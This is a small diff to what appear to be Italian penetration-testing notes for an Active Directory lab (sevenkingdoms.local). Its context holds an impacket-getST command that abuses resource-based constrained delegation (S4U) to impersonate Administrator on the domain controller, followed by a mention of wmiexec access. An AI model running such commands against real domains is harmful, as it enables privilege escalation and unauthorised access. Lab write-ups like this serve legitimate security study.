@@ -50,4 +50,5 @@ Ora che abbiamo la delegazione possiamo fare S4U
 ```bash
 impacket-getST -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/rbcd$:rbcdpass'
 ```
+![[Pasted image 20230911115059.png]]
 ed accedere con wmiexec
